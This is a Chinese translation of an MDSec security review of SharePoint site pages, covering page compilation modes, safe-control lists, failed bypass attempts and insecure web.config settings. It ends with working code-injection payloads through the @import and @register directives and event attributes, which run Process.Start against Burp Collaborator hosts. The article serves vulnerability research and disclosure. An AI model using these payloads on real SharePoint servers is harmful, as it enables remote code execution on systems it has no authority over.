
# SharePoint站点页面安全性分析


                                阅读量   
                                **637909**
                            
                        |
                        
                                                                                                                                    ![](./img/200027/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者mdsec，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/](https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/200027/t01568433cf5d271764.jpg)](./img/200027/t01568433cf5d271764.jpg)



## 0x00 前言

如果大家使用过SharePoint，那么应该会对两种ASPX页面比较熟悉：
- 应用程序（Application）页面
- 站点（Site）页面
应用程序页面无法自定义，这类页面存放在文件系统中，负责基础性任务。比如`/_layouts/[version]/settings.aspx`文件就是一个典型的应用程序页面，负责各种站点设置。这些文件经过.NET Framework编译。

在SharePoint站点中，管理员可以自定义站点页面，这类页面存放在数据库中（未编辑的站点页面可以存放在文件系统中，可以进行编译）。默认情况下，每个SharePoint站点中都存在一些站点页面，这些页面在未编辑时也可以称为“Ghost页面”（Ghost Page）。每个站点都可以自定义这些页面，消除这些页面的“Ghost”状态。该过程将在站点数据库中创建目标页面的副本，以便后续的定制操作。

那么我们（包括SharePoint新手或者有经验的测试人员）自然会提出一个常见的安全性问题：

> 恶意管理员用户具备站点页面的创建及编辑权限，那么SharePoint如何保护站点安全？毕竟我们面对的是一些动态页面，比如`default.aspx`，我们能否使用ASPX文件在服务器上执行代码？

答案比较简单：SharePoint会禁止内联代码，也会在非编译模式下解析这些页面。这种安全机制的绕过方法基本上与绕过.NET Framework中的`CompilationMode.Never`设置相同，因此应该将其当成一个安全问题来处理。

在本次研究中，我们分析了SharePoint如何处理站点页面，也分析了如何绕过当前的缓解机制。这些绕过技术有可能帮助攻击者攻击SharePoint在线服务器，而在目前的漏洞赏金计划中，完成这些任务一般能收获不俗的赏金（大概1.5~2.0万美元）。

在本文中我们尽量使用最简单的示例及术语，没有花太多精力在逆向分析SharePoint或.NET Framework代码上，因此某些定义可能不够完整，但我们会尽力尝试囊括尽可能多的信息，以便在该领域开展后续研究。



## 0x01 CompilationMode

SharePoint使用了一些技术，避免攻击者在非Ghost状态的页面（即自定义页面）中执行代码。

比如，在反编译`Microsoft.SharePoint.dll`文件后，我们可以在`Microsoft.SharePoint\Microsoft\SharePoint\ApplicationRuntime\PageParserSettings.cs`类文件中找到如下设置。

```
CompilationMode.Never
```

`CompilationMode.Never`是SharePoint在处理自定义页面时的默认设置。因此，服务器会解析非Ghost ASPX页面，并没有将其编译到DLL中。这种机制实际上可以阻止所有的内联代码及事件处理程序。

另一方面，`CompilationMode.Always`适用于Ghost页面及应用程序页面。

```
AllowServerSideScript = False and AllowUnsafeControls = False
```

这是所有页面的默认设置，可以阻止内联代码，限制页面中可以使用的控件数量。



## 0x02 失败的尝试

我们尝试了许多绕过方法，也有很多方法没有成功，但还是可以提一下这些方法，供后续研究参考。此外，某些技术在某些类似场景下可能会派上用场。

### <a class="reference-link" name="%E5%9C%A8%E4%BE%8B%E5%A4%96%E5%88%97%E8%A1%A8%E4%B8%AD%E5%88%9B%E5%BB%BA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95"></a>在例外列表中创建不存在的文件或目录

除了应用程序页面及Ghost站点页面外，我们还有可能使用例外列表来运行代码。在默认安装的SharePoint中，例外列表中包含的文件和目录如下所示。

例外目录：

```
/app_themes
/app_browsers
/_layouts
/_controltemplates
/_wpresources
/_windows
/_vti_bin
/_login
/App_GlobalResources
/bin
/wpresources
/_app_bin
/_vti_pvt
```

例外文件：

```
/defaultwsdlhelpgenerator.aspx
/clientaccesspolicy.xml
/crossdomain.xml
/global.asax
/web.config
```

因此我们首先想到的是将自己的代码插入例外文件或者目录中，比如`defaultwsdlhelpgenerator.aspx`就是一个理想的目标，该文件并不存在于Web目录中。然而经过测试后，我们无法查看或者编辑创建后的站点页面，服务端会显示一个默认的.NET 404错误消息，这与正常不存在的文件不同。

例外列表中不存在的目录用处不大，不能承载任何文件。在此次研究过程中，我们使用dnSpy调试SharePoint，并没有找到明显的利用点，但后续还是可以研究一下为什么服务端会返回不同的错误消息（有可能这里存在没被人注意到的小细节）。

### <a class="reference-link" name="%E6%BB%A5%E7%94%A8%E6%96%87%E6%9C%AC%E6%A8%A1%E6%9D%BF%E6%8C%87%E4%BB%A4"></a>滥用文本模板指令

一开始我们认为可以使用特定指令（directive）中的某些属性实现绕过，不幸的是这种思路没有成功。服务器允许的指令及属性被列入了白名单中，并且某些有趣的属性也已经被服务端忽略。服务器也能够正确解析来自虚拟路径的嵌入文件，而可能被编译的文件（如XAMLX文件）也无法直接上传到SharePoint。后续我们还是可以继续研究是否有服务端允许的其他属性能够被滥用。

服务端允许的指令如下所示：

```
page, control, master, mastertype, register, previouspage, previouspagetype, reference, assembly, import, implements
```

我们可以通过反汇编代码中的`Microsoft.SharePoint\Microsoft\SharePoint\ApplicationRuntime\SPPageParserFilter.cs`类文件来查看关于服务端允许设置的更多信息。

### <a class="reference-link" name="%E6%BB%A5%E7%94%A8%E5%86%85%E8%81%94%E4%BB%A3%E7%A0%81%E3%80%81%E4%BA%8B%E4%BB%B6%E6%88%96%E8%80%85%E8%A1%A8%E8%BE%BE%E5%BC%8F"></a>滥用内联代码、事件或者表达式

尽管服务端阻止了内联代码，但我们不能轻易放弃这一点。如果能够使用[内联表达式](https://support.microsoft.com/en-gb/help/976112/introduction-to-asp-net-inline-expressions-in-the-net-framework)，这一点我们认为还是可以派上用场。然而经过研究后，我们发现自己需要处理的是.NET Framework的相关设置，而不单单是SharePoint的设置，因此工作量不可同日而语。

内联代码无法使用，是因为服务端能正确解析代码，默认情况下会禁用所有代码块。在这种情况下，服务端还会禁用某些内联表达式。比如，由于存在这种限制，服务端会阻止如下元素：

```
&lt;script runat="server"&gt;foobar&lt;/script&gt;
&lt;script src="test.cs" runat="server"&gt;&lt;/script&gt;
&lt;% foobar %&gt;
&lt;%= foobar %&gt;
&lt;%# foobar %&gt;
```

虽然如下表达式不会引起任何错误，但也不能用于代码执行：

1、表达式生成器：通常情况下，这种语法类似于`&lt;%$ expressionPrefix:someValues %&gt;`。在默认情况下，服务端支持如下表达式生成器：
<li>
`AppSettings`：可以用来读取应用程序设置。然而，SharePoint应用程序设置中并没有嵌入任何私密代码。</li>
<li>
`ConnectionStrings`：如果自定义SharePoint在共享的`web.config`文件中使用该表达式，那么我们只能使用该表达式来获取连接字符串。</li>
<li>
`Resources`：可以用来读取可访问的资源。然而这些资源要么用处不大，要么并没有包含任何私密信息。</li>
<li>
`RouteUrl`及`RouteValue`：这些表达式可以用来处理路由功能，从URL中读取信息，或者处理链接。同样，由于我们无法在SharePoint中定义自己的路由，因此这里没有直接的利用场景。</li>
2、特定的数据绑定表达式：我们找到了两种被允许的数据绑定表达式，分别为`Bind`及`Eval`。虽然这些表达式没有被阻止，但也无法被我们滥用。在受限编译模式下，我们无法通过这些表达式来调用任何属性。此外，`Eval`表达式同样需要服务端脚本权限。

由于使用了`CompilationMode.Never`，事件属性也不能派上用场，服务端会立即阻塞这些属性。

### <a class="reference-link" name="%E6%BB%A5%E7%94%A8%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8E%A7%E4%BB%B6"></a>滥用有趣的控件

如果我们能找到被允许的控件，通过设置控件属性来执行有趣的操作，那么就有可能成功攻击目标服务器。比如，我们可以通过如下方式，利用XML控件实现XXE，从文件系统中窃取文件：

```
&lt;asp:xml DocumentSource="probesdl.xml" runat="server"&gt;&lt;/asp:xml&gt;
```

不幸的是，SharePoint在默认情况下并不允许该控件，我们可以查看`web.config`文件中的如下设置：

```
&lt;SafeControl
               Assembly="System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" 
               Namespace="System.Web.UI.WebControls"
               TypeName="Xml"
               Safe="False"
               AllowRemoteDesigner="False"
               SafeAgainstScript="False"
/&gt;
```

需要注意的是，SharePoint使用了白名单及黑名单机制来允许安全的控件，因此其中可能的确存在能够利用的控件。在初步分析中，我们搜索了与.NET反序列化有关的关键词，但没有找到任何有趣的控件。然而服务端中还是存在许多扩展，有可能会被滥用，这需要进一步研究。



## 0x03 常见错误配置

### <a class="reference-link" name="%E5%85%81%E8%AE%B8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%8E%A7%E4%BB%B6"></a>允许不安全的控件

在审查SharePoint应用程序的安全性时，我们需要审查自定义控件或者已导入的控件的安全性。允许不安全控件可能意味着某些ASCX文件可以被注入到ASPX或者Master文件中。如果启用了编译选项，那么攻击者就可能通过这种方式在服务端上运行代码。

例如，`web.config`文件（路径为`Drive:\inetpub\wwwroot\wss\VirtualDirectories[port]`）中的如下设置演示了如何配置不安全控件：

```
&lt;SafeMode MaxControls="200" CallStack="false" DirectFileDependencies="10" TotalFileDependencies="250" AllowPageLevelTrace="false"&gt;
    PageParserPaths&gt;
        &lt;PageParserPath VirtualPath="/_catalogs/masterpage/*" CompilationMode="Never" AllowServerSideScript="false" IncludeSubFolders="false" AllowUnsafeControls="true" /&gt;
    &lt;/PageParserPaths&gt;
&lt;/SafeMode&gt;
```

虽然由于缺少服务端代码及编译条件，这种配置无法导致代码执行，但依然留下了可能被攻击的一个点，需要进一步研究。

### <a class="reference-link" name="%E5%85%81%E8%AE%B8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E8%AF%91%E6%A8%A1%E5%BC%8F"></a>允许服务端脚本的编译模式

这可能不是最安全的一种简单解决方案，有可能破坏所有安全机制。虽然在特定路径下允许编译是非常危险的一种操作，但有时候是SharePoint系统管理员唯一可选的一种方案，可以帮助偷懒的管理员早点收工。这种方式将允许通过文件上传实现代码执行，也是经典的一种代码执行方式。

如下示例是非常不安全的一种配置，允许Master文件执行代码：

```
&lt;SafeMode MaxControls="200" CallStack="false" DirectFileDependencies="10" TotalFileDependencies="250" AllowPageLevelTrace="false"&gt;
    &lt;PageParserPaths&gt;
        &lt;PageParserPath VirtualPath="/_catalogs/masterpage/*" CompilationMode="Always" AllowServerSideScript="true" IncludeSubFolders="true"/&gt;
    &lt;/PageParserPaths&gt;
&lt;/SafeMode&gt;
```

恶意站点管理员可以上传恶意master文件，然后在ASPX文件中引用该文件，从而实现在服务端执行代码，或者也可以在`/_catalogs/masterpage/`目录中直接上传一个ASPX文件，达到相同目标。

### <a class="reference-link" name="%E7%A6%81%E7%94%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E8%AF%91%E6%A8%A1%E5%BC%8F"></a>禁用服务端脚本的编译模式

此时我们无法启用未编译的服务端脚本，但有可能通过其他方式完成任务。尽管这种设置并不能帮助开发者简化开发过程，但看上去是可以挑战的一项任务。这种方式提供了一定的可扩展性及安全性，我们也在其他场景中看过这类配置条件。

典型的配置信息如下所示：

```
&lt;SafeMode MaxControls="200" CallStack="false" DirectFileDependencies="10" TotalFileDependencies="250" AllowPageLevelTrace="false"&gt;
    &lt;PageParserPaths&gt;
        &lt;PageParserPath VirtualPath="/_catalogs/masterpage/*" CompilationMode="Always" AllowServerSideScript="false" IncludeSubFolders="false"/&gt;
    &lt;/PageParserPaths&gt;
&lt;/SafeMode&gt;
```

这种设置可以轻松阻止内联脚本、事件属性、可用的表达式甚至某些指令（如`[@assembly](https://github.com/assembly)`）。

我们找到了一种方法，可以通过事件属性执行命令，这也可能是服务端会阻止事件属性、将其当成内联脚本的原因所在：

```
&lt;asp:Button id="Button1"    Text="Apply Image Alignment" OnClick='x);return @__ctrl;}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c ping dsdssd.jzmubrc7b4iom5zs53xnt0jroiu8ix.burpcollaborator.net");private void x(Object sender,EventArgs e){}private int f(int @__ctrl){//' runat="server"/&gt;
```

如果服务端允许事件处理程序，那么就可以将以上代码注入已编译的代码中。

当数据绑定编译服务端允许的代码及脚本时，我们也找到了一种有趣的代码注入方法：

```
&lt;asp:Label ID="lblHello" runat="server" Text='&lt;%# Eval("a"));}object/**/test2=System.Diagnostics.Process.Start("ping","aaaax.ynp9z60mzj63akn7til2hf76cxir6g.burpcollaborator.net");private/**/void/**/test(){//+"x")%&gt;'&gt;&lt;/asp:Label&gt;
&lt;asp:Literal runat="server" Text='' /&gt;
```

然而这种方式并不是特别有用，因为服务端会阻止内联脚本。如果我们能将代码嵌入`/app_themes/`目录的`.skin`文件中，有可能实现代码执行，但这在SharePoint中是无法完成的一个任务。我们可以观察`System.Web.UI.ControlBuilder`[类](https://referencesource.microsoft.com/#System.Web/UI/ControlBuilder.cs,09e75757f9574fcb,references.)的`PreprocessAttribute`方法，分析其中的验证及数据提取过程。

我们花了不少时间，最终找到了一种解决方案，可以通过`[@import](https://github.com/import)`和`[@register](https://github.com/register)`指令实现代码注入。比如，我们可以通过如下payload，将代码注入到C#文件中（C#文件由.NET基于ASPX文件自动创建）：

```
&lt;%@ Page language="C#" classname="mytest_irsdl" %&gt; 
&lt;%@ import Namespace='System.Net;public/**/class/**/mytest_irsdl:global::System.Web.UI.Page,System.Web.SessionState.IRequiresSessionState,System.Web.IHttpHandler{public/**/static/**/object/**/@__stringResource;public/**/static/**/object/**/@__fileDependencies;public/**/static/**/bool/**/__initialized=false;object/**/test2=System.Diagnostics.Process.Start("ping","itsover.g9qrlom4l1slw29pf07k3xtoyf47sw.burpcollaborator.net");}}namespace/**/foo{using/**/System.Linq;using/**/System.Web.Security;using/**/System.Collections.Generic;using/**/System.Text.RegularExpressions;using/**/System.Web.UI.WebControls;using/**/System.Xml.Linq;using/**/System.Web.UI;using/**/System;using/**/System.Web.UI.HtmlControls;using/**/System.Web;using/**/System.Configuration;using/**/System.ComponentModel.DataAnnotations;using/**/System.Text;using/**/System.Web.Profile;using/**/System.Web.Caching;using/**/System.Collections;using/**/System.Web.UI.WebControls.WebParts;using/**/System.Web.UI.WebControls.Expressions;using/**/System.Collections.Specialized;using/**/System.Web.SessionState;using/**/System.Web.DynamicData;//' %&gt;
```

或者可以使用如下方式：

```
&lt;%@ Page language="C#" classname="mytest_irsdl" %&gt; 
&lt;%@ Register Tagprefix="MDSec" Namespace='System.Windows.Data;public/**/class/**/mytest_irsdl:global::System.Web.UI.Page,System.Web.SessionState.IRequiresSessionState,System.Web.IHttpHandler{public/**/static/**/object/**/@__stringResource;public/**/static/**/object/**/@__fileDependencies;public/**/static/**/bool/**/__initialized=false;object/**/test2=System.Diagnostics.Process.Start("ping","xxx.g9qrlom4l1slw29pf07k3xtoyf47sw.burpcollaborator.net");}}namespace/**/foo{using/**/System.Linq;using/**/System.Web.Security;using/**/System.Collections.Generic;using/**/System.Text.RegularExpressions;using/**/System.Web.UI.WebControls;using/**/System.Xml.Linq;using/**/System.Web.UI;using/**/System;using/**/System.Web.UI.HtmlControls;using/**/System.Web;using/**/System.Configuration;using/**/System.ComponentModel.DataAnnotations;using/**/System.Text;using/**/System.Web.Profile;using/**/System.Web.Caching;using/**/System.Collections;using/**/System.Web.UI.WebControls.WebParts;using/**/System.Web.UI.WebControls.Expressions;using/**/System.Collections.Specialized;using/**/System.Web.SessionState;using/**/System.Web.DynamicData;//' Assembly="PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %&gt;
```

效果如下图所示：

[![](./img/200027/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01144ea84a471559f6.png)



## 0x04 总结及后续工作

在本文中，我们分析了SharePoint站点页面的安全性，演示了如何在不使用服务端脚本的编译模式下，通过代码注入实现代码执行目标。

后续我们可以继续研究服务端已允许的控件的作用，其中某些控件可能会导致某些漏洞，比如SSRF。

如果大家对SharePoint中`VirtualPathProvider`的工作方式比较感兴趣，可以进一步了解`SPVirtualPathProvider`的相关内容。



## 0x05 参考资料
- [Introduction to SharePoint Services 3.0 for Developers](https://books.google.co.uk/books?id=zdXoAQAAQBAJ)
- [Stack Exchange Q&amp;A](https://sharepoint.stackexchange.com/questions/79514/difference-between-pageparserpath-and-safecontrol)